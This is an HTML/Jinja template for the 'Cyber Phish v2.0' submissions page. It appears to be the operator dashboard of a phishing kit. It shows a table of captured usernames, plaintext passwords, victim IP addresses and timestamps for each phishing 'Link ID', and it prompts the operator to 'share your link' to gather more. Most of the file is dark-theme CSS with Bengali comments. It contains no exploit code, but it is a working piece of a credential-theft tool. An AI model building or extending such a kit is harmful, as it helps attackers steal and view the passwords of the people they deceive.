<!DOCTYPE html>
<html>
<head><title>Cyber Phish - Submissions</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        background: #070d1a;
        font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
        min-height: 100vh;
        color: #e0e0e0;
        position: relative;
        overflow-x: hidden;
        padding: 20px;
    }
    /* অ্যানিমেটেড ব্যাকগ্রাউন্ড */
    body::before {
        content: '';
        position: fixed;
        inset: 0;
        background: radial-gradient(circle at 20% 30%, #0f1a3a, #070d1a 70%);
        z-index: -2;
    }
    body::after {
        content: '';
        position: fixed;
        inset: 0;
        background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%2300ffff' fill-opacity='0.04'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
        opacity: 0.3;
        z-index: -1;
    }

    .container { max-width: 1200px; margin: 0 auto; }

    /* গ্লাস কার্ড */
    .glass-card {
        background: rgba(10, 18, 34, 0.65);
        backdrop-filter: blur(20px);
        -webkit-backdrop-filter: blur(20px);
        border-radius: 40px;
        border: 1px solid rgba(0, 255, 255, 0.15);
        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(0, 255, 255, 0.05) inset;
        padding: 30px 32px;
        transition: 0.4s ease;
        position: relative;
        overflow: hidden;
    }
    .glass-card::before {
        content: '';
        position: absolute;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: radial-gradient(circle at 30% 20%, rgba(0, 255, 255, 0.03), transparent 60%);
        pointer-events: none;
    }

    /* ব্র্যান্ড */
    .brand {
        font-size: 2.2rem;
        font-weight: 800;
        text-align: center;
        background: linear-gradient(135deg, #00ffff, #a855f7);
        -webkit-background-clip: text;
        background-clip: text;
        color: transparent;
        text-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
        letter-spacing: 1px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        margin-bottom: 10px;
    }
    .brand i {
        font-size: 2.5rem;
        color: #00ffff;
        text-shadow: 0 0 20px #00ffff;
    }
    .brand small {
        font-size: 0.9rem;
        opacity: 0.6;
        font-weight: 400;
        background: rgba(255,255,255,0.05);
        padding: 2px 14px;
        border-radius: 40px;
        border: 1px solid rgba(255,255,255,0.06);
    }

    /* হেডার */
    .page-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        flex-wrap: wrap;
        gap: 16px;
        margin-bottom: 20px;
        padding-bottom: 16px;
        border-bottom: 1px solid rgba(0, 255, 255, 0.06);
    }
    .page-header h2 {
        font-size: 1.6rem;
        font-weight: 700;
        background: linear-gradient(135deg, #b0fff0, #00ffff);
        -webkit-background-clip: text;
        background-clip: text;
        color: transparent;
        display: flex;
        align-items: center;
        gap: 12px;
    }
    .page-header h2 i {
        color: #00ffff;
        text-shadow: 0 0 15px #00ffff;
    }

    .btn-back {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        background: rgba(0, 255, 255, 0.08);
        padding: 8px 20px;
        border-radius: 60px;
        border: 1px solid rgba(0, 255, 255, 0.1);
        color: #8ae6e6;
        font-size: 0.9rem;
        font-weight: 500;
        text-decoration: none;
        transition: 0.3s;
    }
    .btn-back:hover {
        background: rgba(0, 255, 255, 0.15);
        border-color: rgba(0, 255, 255, 0.25);
        color: #b0fff0;
        transform: translateX(-4px);
    }

    /* লিংক আইডি */
    .link-id-box {
        background: rgba(0, 0, 0, 0.3);
        border-radius: 30px;
        padding: 10px 20px;
        display: inline-flex;
        align-items: center;
        gap: 12px;
        border: 1px solid rgba(0, 255, 255, 0.06);
        margin-bottom: 24px;
        flex-wrap: wrap;
    }
    .link-id-box strong {
        color: #8ae6e6;
        font-weight: 600;
    }
    .link-id-box code {
        background: rgba(0, 0, 0, 0.5);
        padding: 4px 14px;
        border-radius: 30px;
        color: #b0fff0;
        font-family: 'Courier New', monospace;
        font-size: 1rem;
        border: 1px solid rgba(0, 255, 255, 0.08);
    }

    /* টেবিল */
    .table-wrapper {
        overflow-x: auto;
        border-radius: 24px;
        border: 1px solid rgba(0, 255, 255, 0.06);
        background: rgba(0, 0, 0, 0.2);
        backdrop-filter: blur(4px);
    }
    table {
        width: 100%;
        border-collapse: collapse;
        font-size: 0.95rem;
    }
    thead {
        background: rgba(0, 255, 255, 0.04);
        border-bottom: 1px solid rgba(0, 255, 255, 0.08);
    }
    th {
        text-align: left;
        padding: 14px 18px;
        font-weight: 600;
        color: #8ae6e6;
        text-transform: uppercase;
        font-size: 0.75rem;
        letter-spacing: 0.5px;
    }
    td {
        padding: 14px 18px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.03);
        color: #d0e0e0;
        vertical-align: middle;
    }
    tr:last-child td {
        border-bottom: none;
    }
    tr:hover td {
        background: rgba(0, 255, 255, 0.03);
    }
    .empty-state {
        text-align: center;
        padding: 40px 20px;
        color: #5a7a8a;
    }
    .empty-state i {
        font-size: 3rem;
        color: #2a4a5a;
        margin-bottom: 16px;
        display: block;
        text-shadow: 0 0 30px rgba(0, 255, 255, 0.05);
    }
    .empty-state p {
        font-size: 1rem;
        font-weight: 400;
    }

    /* রেস্পন্সিভ */
    @media (max-width: 768px) {
        .glass-card { padding: 20px; }
        .brand { font-size: 1.6rem; }
        .page-header h2 { font-size: 1.2rem; }
        .btn-back { font-size: 0.8rem; padding: 6px 16px; }
        .link-id-box code { font-size: 0.85rem; }
        th, td { padding: 10px 14px; font-size: 0.85rem; }
    }
    @media (max-width: 480px) {
        .brand { font-size: 1.3rem; }
        .brand i { font-size: 1.8rem; }
        .page-header { flex-direction: column; align-items: flex-start; }
        .link-id-box { width: 100%; justify-content: center; }
        th, td { padding: 8px 12px; font-size: 0.8rem; }
    }
</style>
</head>
<body>
<div class="container">

    <div class="glass-card">

        <!-- ব্র্যান্ড -->
        <div class="brand">
            <i class="fas fa-shield-halved"></i>
            CYBER PHISH
            <small>v2.0</small>
        </div>

        <!-- হেডার -->
        <div class="page-header">
            <h2><i class="fas fa-inbox"></i> Submissions</h2>
            <a href="/phis/dashboard" class="btn-back"><i class="fas fa-arrow-left"></i> Back</a>
        </div>

        <!-- লিংক আইডি -->
        <div class="link-id-box">
            <strong><i class="fas fa-fingerprint"></i> Link ID:</strong>
            <code>{{ link_id }}</code>
        </div>

        <!-- টেবিল -->
        <div class="table-wrapper">
            <table>
                <thead>
                    <tr>
                        <th><i class="fas fa-user"></i> Username</th>
                        <th><i class="fas fa-lock"></i> Password</th>
                        <th><i class="fas fa-network-wired"></i> IP</th>
                        <th><i class="far fa-clock"></i> Time</th>
                    </tr>
                </thead>
                <tbody>
                {% for sub in subs %}
                <tr>
                    <td>{{ sub.username }}</td>
                    <td><span style="background:rgba(255,255,255,0.05);padding:2px 10px;border-radius:30px;font-family:monospace;">{{ sub.password }}</span></td>
                    <td>{{ sub.ip }}</td>
                    <td>{{ sub.submitted_at }}</td>
                </tr>
                {% else %}
                <tr>
                    <td colspan="4">
                        <div class="empty-state">
                            <i class="fas fa-fish"></i>
                            <p>No submissions yet. Share your link first.</p>
                        </div>
                    </td>
                </tr>
                {% endfor %}
                </tbody>
            </table>
        </div>

    </div>

</div>
</body>
    </html>
